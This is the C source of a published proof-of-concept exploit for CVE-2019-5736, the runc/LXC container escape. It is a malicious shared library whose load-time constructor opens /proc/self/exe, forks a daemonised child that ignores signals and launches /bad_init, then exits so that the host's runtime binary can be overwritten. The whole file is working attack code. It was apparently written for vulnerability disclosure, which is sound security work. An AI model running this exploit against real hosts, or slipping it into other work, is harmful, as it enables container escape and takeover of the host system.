/*
 * CVE-2019-5736: PoC Exploit Code
 * Copyright (C) 2019 Aleksa Sarai <cyphar@cyphar.com>
 * Vulnerability discovered by Adam Iwaniuk and Borys Popławski.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to
 * deal in the Software without restriction, including without limitation the
 * rights to use, copy, modify, merge, publish, distribute, sublicense, and/or
 * sell copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * * The above copyright notice and this permission notice shall be included in
 *   all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS
 * IN THE SOFTWARE.
 */

#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/signal.h>
#include <fcntl.h>
#include <stdio.h>

#define LOG_PATH "/tmp/bad_init_log"
#define abrt(msg) \
	do { fprintf(stderr, msg ": %m\n"); abort(); } while (0)

void bad_seccomp_init(void)
{
	int fd, err;
	pid_t pid;
	char *fdpath;

	printf("[+] bad_libseccomp.so booted.\n");

	fd = open("/proc/self/exe", O_RDONLY|O_PATH);
	if (fd < 0)
		abrt("failed to ro-open /proc/self/exe");

	printf("[+] opened ro /proc/self/exe <%d>.\n", fd);

	err = asprintf(&fdpath, "/proc/self/fd/%d", fd);
	if (err < 0)
		abrt("failed to asprintf fdpath");

	printf("[+] constructed fdpath <%s>\n", fdpath);

	pid = fork();
	if (pid < 0)
		abrt("failed to fork");
	else if (!pid) {
		int nullfd, logfd;

		/* Dup over all stdio. */
		nullfd = open("/dev/null", O_RDWR|O_CLOEXEC);
		if (nullfd < 0)
			abrt("open /dev/null");
		logfd = open(LOG_PATH, O_WRONLY|O_CREAT|O_CLOEXEC);
		if (logfd < 0)
			abrt("creat " LOG_PATH);

		dup3(nullfd, 0, 0);
		dup3(logfd, 1, 0);
		dup3(logfd, 2, 0);

		/* Ignore some fun signals. */
		signal(SIGCHLD, SIG_IGN);
		signal(SIGTSTP, SIG_IGN);
		signal(SIGTTOU, SIG_IGN);
		signal(SIGTTIN, SIG_IGN);
		signal(SIGHUP, SIG_IGN);
		signal(SIGTERM, SIG_IGN);

		/* Daemonise so lxc-attach won't kill us when it exits. */
		setsid();
		execl("/bad_init", "/bad_init", fdpath, NULL);
	}

	printf("[+] bad_init is ready -- see <%s> for logs.\n", LOG_PATH);
	printf("[*] dying to allow /proc/self/exe to be unused...\n");
	exit(0);
}
void __attribute__((constructor)) bad_seccomp_init(void);
